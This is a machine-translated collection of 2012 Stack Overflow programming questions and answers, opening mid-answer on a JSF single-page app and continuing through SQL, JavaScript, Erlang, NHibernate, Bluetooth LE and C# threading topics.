为了实现您的单页应用程序，您应该说明应该呈现页面的哪一部分。这可以通过**使用**诸如创建、编辑、列表等布尔标志来完成。例如，请参见以下（**仅相关代码**）

```
<h:body>
    <h:form rendered="#{userController.stateManager.create}">
        <h:panelGroup rendered="#{not empty facesContext.messageList or userController.stateManager.failure}">
            <!--render error message right here-->
        </h:panelGroup>
        <div>
            <label>#{messages['br.com.spa.domain.model.User.name']}</label>
            <h:inputText value="#{user.name}"/>
        </div>
        <h:commandButton action="#{userController.create}">
             <f:ajax execute="@form" render="@all"/>
             <f:actionListener type="br.com.spa.web.faces.listener.StateManagerActionListener" />
             <f:setPropertyActionListener target="#{userController.stateManager.create}" value="true"/>
             <f:setPropertyActionListener target="#{userController.user}" value="#{user}" />
        </h:commandButton>
    </form>
</h:body> 
```

请注意，当标志 create 为 true 时，我们的表单将被呈现 - 请参见上面的第二行。为了包装我们的标志，我们创建了一个名为 StateManager 的类，如下所示

```
/**
  * I am using lombok, which takes care of generating our getters and setters. For more info, please refer http://projectlombok.org/features/index.html
  */
@Setter @Getter
public class StateManager {

    private boolean create;
    private boolean edit;
    private boolean list;

} 
```

现在，因为我们只使用一个页面，我们应该使用一个 ViewScoped 托管 bean，只要您在同一个视图上，它就可以保持我们的托管 bean 范围处于活动状态 -**它是一个单页面应用程序，对吗？所以，没有导航**。考虑到这一点，让我们创建我们的托管 bean。

```
@ManagedBean
@ViewScoped
public class UserController implements StateManagerAwareManagedBean {

    private @Inject UserService service;

    private @Getter @Setter stateManager = new StateManager();

    private @Getter @Setter List<User> userList = new ArrayList<User>();
    private @Getter @Setter User user;

    @PostConstruct
    public void initialize() {
        list();
    }

    public void create() {
        service.persist(user);

        stateManager.setCreate(false);
        stateManager.setList(true);
        stateManager.setSuccess(true);
    }

    public void edit() {
        service.merge(user);

        stateManager.setEdit(false);
        stateManager.setList(true);
        stateManager.setSuccess(true);
    }

    public void list() {
        userList = service.list();

        stateManager.setList(true);
    }

} 
```

对于每个操作方法，我们定义应该呈现页面的哪一部分。例如，考虑到我们的表单已被处理，涵盖了所有 JSF lyfecycle，这意味着它们的值**已成功转换和验证**，并且我们的操作方法被调用。通过使用我们的*创建*操作方法（见上文）作为示例，我们将其创建标志设置为 false，因为我们的表单已被转换和验证，因此我们不需要再次显示它（除非你想要）。此外，我们将列表和成功标志都设置为 true，这表明我们的页面列表应该被渲染并且我们的表单已成功处理 - 您可以使用此标志显示类似“用户创建”之类的内容，如下所示

```
<h:panelGroup rendered="#{userController.stateManager.success}">
    #{messages['default.created.message']}
</h:panelGroup> 
```

现在，让我们讨论第一次调用时应该呈现页面的哪一部分。也许你不知道，但是一个用 @PostConstruct 注释的 void 方法将首先被调用。所以我们定义应该渲染页面的哪一部分。在我们的示例中，我们调用 list 方法，它将其列表标志设置为 true 并填充后备列表。

```
@PostConstruct
public void initialize() {
    list();
} 
```

最后，让我们**回顾一下**嵌套在 h:commandButton中的以下命令

```
<h:commandButton action="#{userController.create}">
    <f:ajax execute="@form" render="@all"/>
    <f:actionListener type="br.com.spa.web.faces.listener.StateManagerActionListener" />
    <f:setPropertyActionListener target="#{userController.stateManager.create}" value="true"/>
    <f:setPropertyActionListener target="#{userController.user}" value="#{user}" />
</h:commandButton> 
```

首先，您应该调用一个 ActionListener - 这里称为 StateManagerActionListener - 它负责重置任何 StateManager - 代码如下。它**必须**在设计用于控制任何标志的任何其他 setPropertyActionListener 之前首先调用，因为在 h:commandButton 中定义的顺序是调用它们的顺序。请记住这一点。

```
public class StateManagerActionListener implements ActionListener {

    public void processAction(ActionEvent e) throws AbortProcessingException {
        Map<String,Object> viewMap = FacesContext.getCurrentInstance().getViewRoot().getViewMap();
        for(Map.Entry<String,Object> entry: viewMap.entrySet()) {
            if(entry.getValue() instanceof StateManagerAwareManagedBean) {
                ((StateManagerAwareManagedBean) entry.getValue()).setStateManager(new StateManager());
            }
        }
    }

} 
```

StateManagerAwareManagedBean - 在我们的 ViewScoped Managed bean 中使用 - 它允许我们重置任何 ManagedBean 的任何 StateManager**而不是在我们的 ActionListener 中一一重置**，定义如下

```
public interface StateManagerAwareManagedBean {

    StateManager getStateManager();
    void setStateManager(StateManager stateManager);

} 
```

其次，在定义我们的 ActionListener 之后，我们使用 setPropertyActionListener 将控制视图的封闭部分的标志设置为 true。它是必需的，因为我们的表单**不应该**被转换和验证。因此，在我们的操作方法中，我们将此标志设置为假，如前所述。

一些笔记

*   用户被标记为 RequestScoped ManagedBean，因此不能使用 ManagedProperty 将其注入到 ViewScoped 中，因为它的范围是有限的。为了克服这个问题，我使用 <f:setPropertyActionListener target="#{userController.user}" value="#{user}"> 设置它的值 - 请参阅我们的表单
*   我们的示例使用需要适当应用服务器的 JEE 功能。有关详细信息，请参阅[http://docs.oracle.com/javaee/6/tutorial/doc/](http://docs.oracle.com/javaee/6/tutorial/doc/)
*   ManagedBean 可以扮演不同的角色，例如Controller、DTO 等。当它扮演控制器的角色时，我更喜欢在它的名字后缀控制器。有关更多信息，请参阅[http://java.dzone.com/articles/making-distinctions-between](http://java.dzone.com/articles/making-distinctions-between)

# sql - SQL多次插入，基于现有行的行数据

> ID：13125058
> 
> 赞同：1
> 
> 时间：2012-10-29T15:51:28.807
> 
> 标签：sql, insert, row

我最近更新了我的表模式以包含一个新列，该列具有一个或多个可能的值，具体取决于行（我可以从另一个表中提取这些可能的值）。我希望更新我的表并将每个当前单行替换为一个或几个新行，其中旧列值都与原始行匹配，并且新列值覆盖每个可能的值一次。

例如，假设我有一个名为 的表`Animal`，其中包含`AnimalType`、`Size`、`Habitat`和`Weight`。我添加了一个名为的新列`Color`- 有些动物只有一种颜色，有些可以有几种可能的颜色中的一种。假设我有一排`Bird`看起来像这样：

```
{ AnimalType = Bird, Size = Small, Habitat = Woods, Weight = under 10 pounds, Color = NULL } 
```

现在假设，根据我的另一张表（称之为`AnimalColors`），它`Birds`可以有三种颜色——红色、蓝色和棕色。

我希望用三个新行替换该单行，如下所示：

```
{AnimalType = Bird, Size = Small, Habitat = Woods, Weight = under 10 pounds, Color = Red}
{AnimalType = Bird, Size = Small, Habitat = Woods, Weight = under 10 pounds, Color = Blue}
{AnimalType = Bird, Size = Small, Habitat = Woods, Weight = under 10 pounds, Color = Brown} 
```

我的`Animals`表中有多行，并希望对每一行执行此操作。

有没有一种简单的方法可以做到这一点？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T15:56:30.410

我会考虑通过保留现有行来解决这个问题。

创建基于现有行填充颜色的新行

删除 NULL 行（在验证它看起来符合预期之后）

```
-- Add rows with color populated
WITH AnimalColors (AnimalType, Color) AS
(
    SELECT 'bird', 'red'
    UNION ALL SELECT 'bird', 'blue'
    UNION ALL SELECT 'bird', 'brown'
    UNION ALL SELECT 'lizard', 'green'
)
, ExistingRows(AnimalType, Size, Habitat, Weight, Color) AS
(
    SELECT 'bird', 'small', 'woods', 'under 10 pounds', NULL
    UNION ALL SELECT 'lizard', 'small', 'rocks', 'under 10 pounds', NULL
)
INSERT INTO
    Animal
(
    AnimalType
,   Size
,   Habitat
,   Weight
,   Color
)
SELECT
    ER.AnimalType
,   ER.Size
,   ER.Habitat
,   ER.Weight
,   AC.Color
FROM
    AnimalColors AC
    INNER JOIN
        ExistingRows ER
        ON ER.AnimalType = AC.AnimalType;

-- Manually review values of Animal table
SELECT A.* FROM Animal A ORDER BY A.AnimalType, A.Color;

-- Remove the uncolored rows
DELETE A FROM Animal A WHERE A.Color IS NULL; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T15:55:03.387

丁：

您需要为可能具有多个值的任何属性添加另一个表，否则您将来在更新和删除时会遇到麻烦（请参阅规范化）。

例如，添加一个“AnimalColor”表，该表使用 AnimalID 链接回 Animal 表。您的数据库可能如下所示：

```
Animals
AnimalID  AnimalName

AnimalColors
AnimalID  Color 
```

# operating-system - 需要确认我的解决方案

> ID：13125061
> 
> 赞同：2
> 
> 时间：2012-10-29T15:51:35.220
> 
> 标签：operating-system

以下代码是尝试解决 N 进程临界区问题。你能告诉我是对还是错！请给我一个小细节！请

```
 boolean array want[1..n] [false,…., false]
      loop forever
     non-critical section
      p1: want[i] true
      p2: for all processes j< i
      p3: if want[j]
    p4: want [i] false
    p5: while not want[j] do skip
       goto p1
       p6: for a ll processes j>i
      p7: while not want[j] do skip
     critical section
         p8: want[i] false 
```

# javascript - 访问在加载范围内定义的函数的技巧

> ID：13125065
> 
> 赞同：1
> 
> 时间：2012-10-29T15:51:55.650
> 
> 标签：javascript, jquery

我的[代码](http://jsfiddle.net/DW55V/)：

```
<a href="javascript:void(0);" onclick="myFunction(this)">Call Function</a>​

$(window).load(function () {
    function myFunction(param) {
        console.log("called");
    }
}); 
```

如您所见，我无法访问该功能（在加载范围内）。我也不能在负载中使用处理程序，因为我处于一个场景中（不要问我为什么，这是一个谷歌地图信息窗口策略）当我创建一些元素时处理程序将被删除（所以，我应该在哪里调用该函数来自对象）。

那么，在加载范围内调用函数是否有“技巧”？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T15:56:46.340

可以在load函数作用域外声明为变量，在load函数作用域内设置值，就可以访问了函数已执行：

```
var myFunction;

$(window).load(function () {
    myFunction = function(param) {
        console.log("called");
    }
}); 
```

[**小提琴**](http://jsfiddle.net/KQJSq/)

或者我会怎么做：

```
<a href="#" id="myAnchor">Call Function</a>​ 
```

--

```
$(function() {
    $("#anchor").on('click', function(e) {
        e.preventDefault();  
        console.log("called");
    });
}); 
```

谷歌地图有自己的处理方式：

```
google.maps.event.addListener(marker, 'click', function(event) { ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T15:56:17.917

为什么不这样做呢？

```
function myFunction(param) {
    console.log("called");
}

$(window).load(function () {
    //Any code you actually need in the load
}); 
```

# actionscript-3 - Actionscript 3.0 深度变化影响我的 2.0 深度管理

> ID：13125066
> 
> 赞同：1
> 
> 时间：2012-10-29T15:52:00.393
> 
> 标签：actionscript-3, depth

我终于抽出时间从 Actionscript 2.0 升级到 Actionscript 3.0，我试图弄清楚如何实现我在 2 中可以使用的一个简单的深度系统，而这在 3 中似乎是不可能的。代码是这样的：

```
onClipEvent(enterFrame){
    this.swapDepths(1000+Math.ceil(this._y));
} 
```

通过这种方式，我可以轻松地获得模拟 3D 效果，因为某些东西在屏幕上上下移动。
也明白，这是一个非常基本的想法的应用。通常我会加入逻辑以允许多个影片剪辑以一个 Y 值存在。
不管怎样，随着AS的深度变化，这种方法在这种状态下已经不可能了。也许我只是对新系统的工作原理不完全了解，我只是一个业余爱好者 AS 程序员，但是在 AS3.0 中是否有更好/更简单/更优雅的方式来实现这一点，而不是跟踪*每个*剪辑/舞台上的精灵？

我正在使用 Adob​​e Flash CS4 专业版，如果这有什么不同的话。此外，这还不是很重要。我仍在了解我的方位，但几周前我在学习添加子电影剪辑时遇到了一个快速项目中的深度变化，似乎我只能*轻松地*将东西添加到舞台的前面或后面，而不是之间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:19:10.660

AS 2.0 和 AS 3.0 的主要区别在于深度管理。在 AS 2.0 中，您可以使用任何您想要的深度。但是，对于 AS 3.0，您不能（保留任何未使用/空的深度）。

仍然有几种方法可以让您更改深度、交换深度等，因此您可以自由使用这些方法。

# css - IE9中的文字阴影和边框

> ID：13125070
> 
> 赞同：0
> 
> 时间：2012-10-29T15:52:31.210
> 
> 标签：css

[此页面在此处](http://www.inside-guides.co.uk/brentwood/events/2012/October/family-halloween.html)使用虚线边框底部作为 h3 事件地址，但在 IE9 中它也显示在其上方。

这是CSS：

```
#middle h3, #middle h4 {
border-bottom:1px dashed #CCC;
padding-bottom:12px;
} 
```

此外，文本阴影在 IE 中根本不起作用，当菜单项悬停时，会出现一个灰色的左边框，想知道如何解决它们。任何想法都会很棒。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T15:56:53.237

您`<h4>`在 div 关闭后关闭了标签

`<div class="event-date"><h4><img src="/images/date.png" alt="event date" /> On 31 October 2012</div> </h4>`

把`</h4>`前面的`</div>`

# php - 使用 sql 中图片的名称从服务器上的路径回显图片

> ID：13125075
> 
> 赞同：0
> 
> 时间：2012-10-29T15:52:49.503
> 
> 标签：php

我正在为我的问题寻找解决方案，我现在使用的代码将显示文件名而不是图片本身。我认为我的回显代码有问题。

这是我正在使用的代码：

```
echo "<table class=showtable>";
echo "<tr>
<td class=show >".$row['ID']."</td>
<td class=show2>".$row['DateTime']."</td>
<td class=show3>".$row['Stock']."</td>
<td class=show4>".$typeArray[$row['Type']]."</td>
<td class=show5>".$tradeArray[$row['Trade']]."</td>
<td class=show5>".$row['Entry']."</td>
<td class=show5>".$row['Stoploss']."</td>
<td class=show5>".$row['Target1']."</td>
<td class=show5>".$row['Target2']."</td>
<td class=show6>".$row['Explination']."</td>
<td class=show7>'<img src='/trades.tiniduske.be/upload/'/>". print $row['Screenshot']  ." </td> </tr>";
 echo "</table>"; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T15:55:07.170

```
echo '<td class=show7><img src="/home/tiniduske/domains/tiniduske.be/public_html/trades/upload/ . $row['Screenshot'] . '"/> </td> </tr>'; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T15:55:07.653

您需要指定 webpath，例如 www.yourdomain.com/path_to_image 其中 path_to_images 是相对于您的 web 根目录.. 而不是您服务器上的文件系统路径。

# sockets - Erlang套接字和接收超时

> ID：13125079
> 
> 赞同：7
> 
> 时间：2012-10-29T15:52:56.057
> 
> 标签：sockets, erlang, timeout

如何设置套接字的接收超时，我在套接字选项中找不到它。
我对这个问题的第一个解决方案是放在声明**之后**。

```
{ok, Listen} = gen_tcp:listen(Port, [..,{active, once}...]),
{ok, Socket} = gen_tcp:accept(Listen),
loop(Socket).
loop(Socket) ->
  receive
     {tcp, Socket, Data} ->
        inet:setopts(Sock, [{active, once}]),
        loop(Socket);
     {tcp_closed, Socket} -> closed;
     Other -> process_data(Other)
  after 1000 -> time_out
  end. 
```

但是套接字可能永远不会超时，因为有来自其他进程的消息如何在不产生其他进程的情况下设置超时？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-29T17:19:33.533

如果您使用活动模式，则无法指定接收超时。如果您需要控制接收超时行为，请在套接字上切换到被动模式，即`{active,false}`在套接字选项上，然后使用`gen_tcp:recv`接收超时选项。

此外，许多 Erlang 套接字服务器设计为每个客户端连接使用一个 Erlang 进程。您可以查看[http://www.trapexit.org/Building_a_Non-blocking_TCP_server_using_OTP_principles](http://www.trapexit.org/Building_a_Non-blocking_TCP_server_using_OTP_principles)和[http://20bits.com/article/erlang-a-generalized-tcp-server](http://20bits.com/article/erlang-a-generalized-tcp-server)示例。OTP 提供了许多使用 Erlang 构建健壮服务器的好方法；好好利用它！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-30T23:16:30.267

您也可以使用 prim_inet:async_recv/3 它允许您在接收来自不同进程的其他消息时接收超时的 tcp 消息

```
read(Socket) ->
prim_inet:async_recv(Socket, 0, 1000),
receive
    {inet_async, _ ,_ ,{ok, Msg}} ->
        io:format("message received ~p~n",[Msg]),
        read(Socket);
    {inet_async,_,_,{error,timeout}} ->
        io:format("timeout !"),
        catch gen_tcp:close(Socket);
    {fake, Msg} -> io:format("Message = ~p~n", [Msg]),
                   read(Socket)
end. 
```

# nhibernate - 在 NHibernate 中使用事务从序列中分配整数

> ID：13125085
> 
> 赞同：1
> 
> 时间：2012-10-29T15:53:33.220
> 
> 标签：nhibernate, transactions

我在数据库中有一些序列，由范围表示。它包含三个字段：beginId、nextId 和 endId。

任务是从这个范围中获取nextId，并确保它是唯一的。代码可以在高度并行化的环境中运行，具有许多线程，在许多机器上。

我需要做什么：

```
lock(database)
{
    var seq = GetSequence()
    var acquiredId = seq.NextId;
    seq.NextId++
    Save(seq)
} 
```

所以我使用这段代码：

```
using (ISession session = GetSessionFactory().OpenSession())
using (ITransaction transaction = session.BeginTransaction(IsolationLevel.RepeatableRead))
{

    var sequence = session.CreateCriteria<Sequence>().Single(); // This line is simplified

    var allocatedId = sequence.NextId; 
    sequence.NextId++;

    session.SaveOrUpdate(sequence);
    transaction.Commit();
    return allocatedId;
} 
```

但是由于某种原因，当我在多线程中运行此代码进行测试时，我收到了多次分配的相同 ID。我正在使用带有 RepeatableRead 锁的事务，但这无济于事。

PS Id 并不意味着表的 Id - 它只是我们使用的名称协议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T11:21:21.257

I've used .Lock().Upgrade when the data is taken from DB, and everything worked. Thanks to hazzik for the link.

Now my code have this:

```
session.QueryOver<Sequence>().Lock().Upgrade.DoSomeFiltering().Single() 
```

# javascript - 了解三元运算符

> ID：13125086
> 
> 赞同：0
> 
> 时间：2012-10-29T15:53:35.893
> 
> 标签：javascript, ternary

我有以下代码：

```
c.m & 3 || (b |= 2, 
  65 <= a && 90 >= a ? a = 65
: 48 <= a && 57 >= a ? a = 48
: b & 1 ? 97 <= a && 122 >= a ? a = 65
: 197 == a || 229 == a ? b &= 5
: 192 <= a && 687 >= a ? a = 192
: 1536 <= a ? a = 1536
: 912 <= a ? a = 912
: 160 <= a ? a = 160
: 127 <= a ? b &= 5
: 33 <= a ? a = 59 
: b &= 5
: 48 > a ? b &= 5
: 65 > a ? a = 59
: 96 > a ? b &= 5
: 112 > a ? a = 96
: 187 > a ? b &= 5
: a = 59); 
```

我什至困惑从哪里开始。是|| 二元运算符？为什么开头有逗号？我想了解这段代码是如何工作的，并使用常规的 if、else、任何提示来重写它？谢谢！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-29T16:04:11.507

如果第`||`一个操作数为真，则运算符返回第一个操作数，否则返回第二个操作数。`&&`做相反的事情：如果它是假的，则返回第一个操作数，否则返回第二个。

`a ? b : c`是`(function(a) {if(a) return b; else return c;}(a);`（不完全是，但这就是想法）的简写。

运算符计算其`,`两个操作数并返回第二个。

考虑到所有这些，上面的代码变为：

```
if( !(k & 3)) {
    b |= 2;
    if( 65 <= a && 90 >= a)
        a = 65;
    else if( 48 <= a && 57 >= a)
        a = 48;
    else if( b & 1) {
        if( 97 <= a && 122 >= a)
            a = 65;
        else if( 197 == a || 229 == a)
            b &= 5;
        else if( 192 <= a && 687 >= a)
            a = 192;
        else if( 1536 <= a)
            a = 1536;
        else if( 912 <= a)
            a = 912;
        else if( 160 <= a)
            a = 106;
        else if( 127 <= a)
            b &= 5;
        else if( 33 <= 1)
            a = 59;
        else
            b &= 5;
    }
    else if( 48 > a)
        b &= 5;
    else if( 65 > a)
        a = 59;
    else if( 96 > a)
        b &= 5;
    else if( 112 > a)
        a = 96;
    else if( 187 > a)
        b &= 5;
    else
        a = 59;
} 
```

不过，我不能告诉你这意味着什么。这只是一堆被检查的数字。`a`在多个范围内进行检查，并设置为特定值或`b`可能会改为更改。这对我来说是一个巨大的混乱，它需要上下文才能有意义。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-29T16:05:46.090

双管表示**OR**和双 & 表示**AND**。
此外， ?: 语法是**if/else**的快捷方式。

所以

```
if (a == 3) alert('a is 3')
else alert('a is NOT 3') 
```

可以写成

```
a == 3 ? alert('a is 3') : alert('a is NOT 3'); 
```

或者

```
alert(a == 3 ? 'a is 3' : 'a is NOT 3') 
```

与单管道和 & 符号（可以与其他一些查询运算符组合，例如 equals - `=`）一样，它们是按位运算符，它们不处理诸如`if (a == 3)`返回布尔值的直接条件。

需要注意的是，在检查值是否未定义时也可以使用双管道。所以它显然将类型转换为布尔值。这是一个例子。

```
// note that val is not defined yet
var val = num || 0;
// so val will be assigned 0\. same as:
if (typeof num == 'undefined') val = 0;
else val = num; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-29T16:21:25.867

这段代码很*糟糕*，没有别的词。这似乎是一些混淆的结果。我知道您想知道这段代码是如何工作的，但混淆代码的全部意义在于它要么不可能要么非常难以解决。
然而，了解所有运营商是什么以及他们做什么，是最好的起点，IMO。[可以在 MDN 上找到](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Operators)各种运算符的完整参考

首先：[按位运算符](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Operators/Bitwise_Operators):
`k & 3`将返回`0`,`1`或`3`。为什么？因为`&`返回左右操作数*“共享”*
的一系列位考虑以下内容：

```
| integer | binary |
====================
|    1    |  0001  |
|    2    |  0010  |
|    3    |  0011  |
|    4    |  0100  |
-------------------- 
```

那么就理所当然地认为`1 & 3`equals ，因为在两个操作数 ( )中`1`只有第一位是*“on” 。* 您的代码段使用的另一个按位运算符是单管道：，在类似的表达式中。记住上表：在 3 中解析，返回 3。这是按位的：如果两个操作数中的任何一个设置为 ，则将每个位设置为。在结果值被赋值给的情况下，这就是赋值运算符的用途，所以如果是 1，将设置为 3，如果是 2 或 3，则什么都不会改变，依此类推。`000>1< & 001>1<`
`|``b |= 2``1 | 2``1 | 3``OR``1``1`
`b |= 2``b``b``b``b`

除此之外，您还有一堆嵌套的三元 ( `x ? a : b`)，完整编写时与以下内容相同：

```
if (x)//truthy
{
    a;
}
else
{
    b;
} 
```

最后，最让你`k & 3 ||...`印象深刻的是一开始的逻辑运算符。这`||`只是一个逻辑*或*。根据左操作数的结果值，使用左操作数或右操作数。同样，它是以下简称：

```
if (k & 3)
{//will be true if either the first, second or both the second and first bits are set on k
    k & 3;
}
else
{//if k is 4, for example
    all the other stuff
} 
```

只需花一些时间浏览 MDN 参考并了解各种运营商。一旦你了解了它们，就好像发现了正则表达式：一个广阔的、令人兴奋的可能性领域展开了，之前需要*很多很多*行代码的东西突然可以只使用一个运算符来编写。

# c#-4.0 - 保存keydown的输出

> ID：13125090
> 
> 赞同：0
> 
> 时间：2012-10-29T15:53:45.833
> 
> 标签：c#-4.0, silverlight-4.0

我抓住了事件，但我需要保存点击的按钮。

例如获取修饰符+ e.key的方法

这是我的代码：

```
protected override void OnKeyDown(KeyEventArgs e)
        {       
            //base.OnKeyDown(e);
            if (Keyboard.Modifiers == ModifierKeys.Control && e.Key == Key.E)
            {
                MessageBox.Show(test.ToString());
            }    
        } 
```

我试图结合两个键

```
 Key test = Key.Ctrl | e.Key ; 
```

但它总是给出错误的结果，例如 Ctrl + E 由于上面的代码导致 J

我想保存它，我想让这些快捷方式通用`UserControls`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:05:20.677

尝试这样使用[KeyGesture](http://msdn.microsoft.com/en-us/library/ms611296.aspx)：

```
private void textBox1_KeyDown(object sender, KeyEventArgs e)
{
    if(e.Key ==Key.E && e.KeyboardDevice.Modifiers==ModifierKeys.Control)
    {
        KeyGesture keyGesture = new KeyGesture(e.Key, e.KeyboardDevice.Modifiers);
        if (keyGesture.Matches(null, e))
        {
            //This should match!
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-30T11:42:20.817

好的，因为我使用 silverlight4 ，我会使用

```
Tuple<ModifierKeys, Key> 
```

它工作得很好，性能也很好

# ruby-on-rails - 从 S3 下载图像到 tmp 文件夹

> ID：13125093
> 
> 赞同：0
> 
> 时间：2012-10-29T15:53:55.593
> 
> 标签：ruby-on-rails, facebook-graph-api, amazon-s3, carrierwave, fog

我正在使用carrierwave +雾来处理S3。我在那里保存图像，然后我需要抓取其中一张并将其发布到 fb...所以我需要做的就是将图像下载到服务器，我找不到这样做的方法carrierwave ...而且我不知道该怎么做，因为要将图像发布到 fb 我需要使用 FILE 调用 POST 到他们的 api ...使用 S3 服务器的 url 发布会很棒。 ..

关于我如何做到这一点的任何想法？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:05:09.820

是的，您可以直接使用网址发布图片。我也将 s3 图像发布到 facebook。使用[php](/questions/tagged/php "显示标记为“php”的问题")，我将 api 称为：

```
$photoId = $facebook->api("me/photos","POST",array('url'=>$pictureUrl,'message'=>'this picture posted using url'));
$photoId = $photoId['id']; 
```

所以我希望你应该能够在 ruby​​-on-rails 中做类似的事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T17:21:50.453

这样做的方法是：

```
RestClient.post "https://graph.facebook.com/#{album_id}/photos",
            :message => photo_message,
            :access_token => access_token, 
            :url => "http://youdomain.com/yourimage.jpg" 
```

我正在使用一个很棒的 gem 来使用名为 rest_client 的其余 api！

我希望这对某人有用！

# iphone - 用于读取测量数据的蓝牙 LE 配置文件

> ID：13125096
> 
> 赞同：2
> 
> 时间：2012-10-29T15:54:00.867
> 
> 标签：iphone, ios, bluetooth, core-bluetooth, bluetooth-lowenergy

在过去的几个小时里，我阅读了很多关于蓝牙 LE 的内容，但我并不真正了解配置文件的工作原理。我想通过 BTLE 将 iPhone 与自制设备配对。设备应通过蓝牙发送测量的温度值、湿度或其他值，iPhone 应读取该数据。

我在 BTLE 规范中读到了不同的配置文件（甚至关于心脏测量），但是在阅读 CO 排放时如何进行？

非常感谢！

问候，玛丽

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-29T23:03:49.970

这有两个方面：您将在您的设备上定义的配置文件以及您将在 iOS 应用程序中与此配置文件进行通信而编写的代码。

在设备上，您将为要收集的测量值定义具有特定服务的配置文件。[您可以在主要的蓝牙开发者网站的列表中找到](http://developer.bluetooth.org/gatt/profiles/Pages/ProfilesHome.aspx)几个标准的蓝牙 LE 配置文件。其中包括温度、心率和步行节奏等配置文件，因此，如果您提供这些类别之一的测量值，您可以让您的设备提供其中一项服务，并且它可以与任何读取该服务的 iOS 应用程序一起使用服务。

对于现有服务之一未涵盖的值，例如您提到的湿度读数，您需要创建自己的自定义服务。您只需定义服务特征（您将提供什么类型的数据以及如何提供它）并为该服务提供一个唯一标识符，因为它是您正在创建的标识符，而不是已放置的标准标识符的一部分由蓝牙组织推出。

您如何定义这些服务和特性将取决于您用于设备的特定蓝牙 LE 硬件。我最近在 Bluegiga 的 BLE112 芯片上完成了大部分工作，该芯片结合了低功耗微控制器和蓝牙 LE 发射器。他们有非常好的工具来定义设备配置文件和创建匹配的固件，并且在他们的芯片上进行设​​置相当简单。我不能代表其他制造商，但他们很可能有类似的东西。

一旦您在硬件上定义了配置文件，您就需要寻找宣传它的设备，并能够在您的 iOS 应用程序中连接到它们。为此，您将使用 Core Bluetooth，我强烈建议您从 Apple 的示例应用程序之一开始，例如他们的[温度传感器](https://developer.apple.com/library/ios/#samplecode/TemperatureSensor/Introduction/Intro.html)示例。该示例使用标准的健康温度计配置文件，但您可以对其进行调整以找到除了温度读数之外的专有服务。您可以在该示例中看到它们如何读取和处理从 LE 设备返回的二进制数据。

我强烈建议观看 Apple 关于该主题的两个 WWDC 2012 会议视频，Session 703 - Core Bluetooth 101 和 Session 705 - Advanced Core Bluetooth，因为它们提供了有关该主题的大量背景信息并展示了该主题的实际使用示例。

# c# - 为什么线程和任务之间的性能差异如此之大？

> ID：13125105
> 
> 赞同：29
> 
> 时间：2012-10-29T15:54:31.160
> 
> 标签：c#, multithreading

*Windows 7，Intel CORE i3，64 位，RAM 4Gb，2.27 GHz
.NET Framework 4.0*

我有以下代码：

```
static void Main(string[] args)
{
    var timer = new Stopwatch();
    timer.Start();

    for (int i = 0; i < 0xFFF; ++i)
    {
        // I use one of the following line at time
        Task.Factory.StartNew(() => { });
        new Thread(() => { }).Start();
    }

    timer.Stop();

    Console.WriteLine(timer.Elapsed.TotalSeconds);
    Console.ReadLine();
} 
```

如果我使用 Task 输出总是小于**0.01 秒**，但如果我使用 Thread 输出总是大于**40 秒**！
这怎么可能？为什么差别这么大？

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2012-10-29T15:56:37.277

两者不一样。

当您使用 时`Task.Factory.StartNew`，您正在安排一个任务在`ThreadPool`. 当你创建一个 new`Thread`时，你必须创建并启动一个新线程。

在第一种情况下，线程已经创建*并重用*。这导致调度任务的开销要低得多，因为不必每次迭代都创建线程。

但是请注意，行为并不相同。创建单独的线程时，每个任务都拥有自己的线程。他们都将立即开始。使用时`Task.Factory.StartNew`，它们被放入调度程序以在 上运行`ThreadPool`，这将（可能）限制启动的并发线程数。这通常是一件好事，因为它可以防止发生超线程。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-29T15:57:06.780

每次启动 a`Task`时，它都会进入一个池，由多个线程提供服务，其中许多线程可能是预先创建的。池中存在任务与线程的`M:N`比率。

每次启动时，`Thread`它都会创建一个新线程以及与线程创建相关的所有开销。由于您正在显式创建线程，因此线程的比例为 1:1。

任务与线程的比率越接近 1，任务启动就越“慢”。实际上，`ThreadPool`确保比率保持远高于 1。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-29T16:01:47.440

您的测试存在问题，因为您没有等待每个线程/任务完成。

任务使用队列，因此创建任务比创建线程快得多。

我敢打赌，即使您等待任务/线程完成，使用任务也会更快。创建然后销毁线程的开销很高。这就是创建 Task.Factory 的原因！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-29T15:56:56.310

`Task.Factory.StartNew()`不会立即启动任务，它只是安排它，因此 TaskScheduled 可以稍后启动它（取决于可用线程/任务的数量）。

MSDN 说，在`Thread.Start()`操作系统可以调度它执行后，与操作系统的交互比使用 .NET Framework 的 TaskScheduler 慢得多，但没有这样的程度。

回到您的示例，0xFFF == 4095，因此您正在调度 4095 个线程，这需要 40 秒。一秒102个线程是个不错的时机！:)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-29T15:58:45.243

调用`Task.Factory.StartNew`不一定会创建一个新线程，它们是由`TaskScheduler`运行代码的机器有多少内核等来管理的。

如果您安排（通过调用`Task.Factory.StartNew`）比可以同时运行的任务更多，它们将排队并在更多资源可用时运行。
